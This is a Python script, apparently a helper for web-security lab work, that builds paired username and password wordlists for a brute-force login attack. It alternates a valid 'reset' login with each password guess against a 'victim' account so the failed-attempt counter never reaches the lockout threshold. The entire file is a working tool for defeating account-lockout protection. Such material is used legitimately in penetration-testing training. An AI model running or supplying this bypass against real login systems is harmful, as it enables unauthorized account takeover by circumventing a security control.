#!/usr/bin/env python3
# lASSEY

"""
interleave_wordlist_generator_2.py
Pitchfork 1:1 alternating injector — reset-first, ultra-safe pattern.
Every odd row is a successful reset. Every even row is a victim attempt.
Counter never exceeds 1 consecutive failure.
"""

import sys
from pathlib import Path


def prompt(label: str, secret: bool = False) -> str:
    import getpass
    value = (getpass.getpass(f"  {label}: ") if secret else input(f"  {label}: ")).strip()
    if not value:
        print(f"[!] {label} cannot be empty.", file=sys.stderr)
        sys.exit(1)
    return value


def build_interleaved(
    passwords: list[str],
    victim_user: str,
    reset_user: str,
    reset_pass: str,
) -> tuple[list[str], list[str]]:
    """
    Strict 1:1 alternating pattern. Reset credential anchors every odd row.
    Victim attempt occupies every even row.

    Row 1:  reset_user   reset_pass      -> SUCCESS  (counter: 0)
    Row 2:  victim_user  candidate_001   -> FAIL     (counter: 1)
    Row 3:  reset_user   reset_pass      -> SUCCESS  (counter: 0)
    Row 4:  victim_user  candidate_002   -> FAIL     (counter: 1)
    ...

    Counter never exceeds 1. Lockout threshold (typically 3) is never approached.
    """
    usernames: list[str] = []
    out_passwords: list[str] = []

    for candidate in passwords:
        usernames.append(reset_user)
        out_passwords.append(reset_pass)
        usernames.append(victim_user)
        out_passwords.append(candidate)

    return usernames, out_passwords


def main() -> None:
    if len(sys.argv) < 2:
        print("[!] Usage: python3 interleave_wordlist_generator_2.py <passwords.txt>", file=sys.stderr)
        sys.exit(1)

    wordlist_path = Path(sys.argv[1])
    if not wordlist_path.is_file():
        print(f"[!] File not found: {wordlist_path}", file=sys.stderr)
        sys.exit(1)

    raw_passwords = [
        line.rstrip("\n")
        for line in wordlist_path.read_text(encoding="utf-8", errors="replace").splitlines()
        if line.strip()
    ]

    if not raw_passwords:
        print("[!] Password wordlist is empty.", file=sys.stderr)
        sys.exit(1)

    print(f"\n[+] {len(raw_passwords):,} candidates loaded\n")

    victim_user = prompt("Victim username")
    reset_user  = prompt("Reset username")
    reset_pass  = prompt("Reset password", secret=True)

    print()

    usernames, passwords = build_interleaved(
        raw_passwords, victim_user, reset_user, reset_pass
    )

    assert len(usernames) == len(passwords), "BUG: list length mismatch"
    assert len(usernames) == len(raw_passwords) * 2, "BUG: row count mismatch"

    out_users = Path("interleaved_users.txt")
    out_pwds  = Path("interleaved_passwords.txt")

    out_users.write_text("\n".join(usernames) + "\n", encoding="utf-8")
    out_pwds.write_text("\n".join(passwords) + "\n", encoding="utf-8")

    print(f"[+] interleaved_users.txt     — {len(usernames):,} lines")
    print(f"[+] interleaved_passwords.txt — {len(passwords):,} lines")
    print(f"[+] Total rows : {len(usernames):,}  ({len(raw_passwords):,} candidates × 2)\n")


if __name__ == "__main__":
    main()
